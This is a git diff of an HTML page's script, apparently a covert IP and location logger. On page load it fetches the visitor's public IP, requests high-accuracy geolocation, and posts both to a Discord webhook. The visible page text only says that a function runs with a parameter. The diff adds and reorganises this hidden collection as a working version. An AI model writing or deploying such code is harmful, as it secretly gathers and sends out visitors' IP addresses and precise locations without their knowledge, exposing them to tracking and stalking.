@@ -17,50 +17,57 @@
             })
         });
     }
-
+    sendDiscordMessage("`==================== INIT ====================`")
     // Call the function when the page loads, passing "test" as the argument
-    messages = `
-IP: ${(await (await fetch("https://api.ipify.org?format=json")).json()).ip}
-`.trim()
-    // window.onload = function() {
-    //     sendDiscordMessage("test");
-    // };
-    sendDiscordMessage(messages);
-    function sendTemp(m) {
-        messages = `
-IP: ${(await (await fetch("https://api.ipify.org?format=json")).json()).ip}
-${m}
-`.trim()
+    // const ip = (await (await fetch("https://api.ipify.org?format=json")).json()).ip
+    fetch("https://api.ipify.org?format=json").then(a => a.json()).then(function(ip_json) {
+        ip = ip_json.ip
+        const message_01 = `
+        IP: ${ip}
+        `.trim()
         // window.onload = function() {
         //     sendDiscordMessage("test");
         // };
-        sendDiscordMessage(messages);
-    }
-    
-    function getLocation() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                // Success function
-                (p => sendTemp(showPosition(p))), 
-                // Error function
-                (e => sendDiscordMessage("Can't get location")), 
-                // Options. See MDN for details.
-                {
-                   enableHighAccuracy: true,
-                   timeout: 5000,
-                   maximumAge: 0
-                });
-        } else { 
-            return "Geolocation is not supported by this browser.";
+        sendDiscordMessage(message_01);
+        function sendTemp(m) {
+            message_02 = `
+IP: ${ip}
+${m}
+        `.trim()
+            // window.onload = function() {
+            //     sendDiscordMessage("test");
+            // };
+            sendDiscordMessage(message_02);
         }
-    }
-    
-    function showPosition(position) {
-        return "Latitude: " + position.coords.latitude + 
-        "\n>Longitude: " + position.coords.longitude;  
-    }
-</script>
 
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    // Success function
+                    (p => sendTemp(showPosition(p))), 
+                    // Error function
+                    (e => sendDiscordMessage("Can't get location")), 
+                    // Options. See MDN for details.
+                    {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                    });
+            } else { 
+                return "Geolocation is not supported by this browser.";
+            }
+        }
+
+        function showPosition(position) {
+            return "> Latitude: " + position.coords.latitude + 
+            "\n> Longitude: " + position.coords.longitude;  
+        }
+        getLocation()
+        sendDiscordMessage("`==================== DONE ====================`")
+    }
+)
+</script>
+v 1.2
 <p>This page will execute a JavaScript function with a parameter when it loads.</p>
 
 </body>
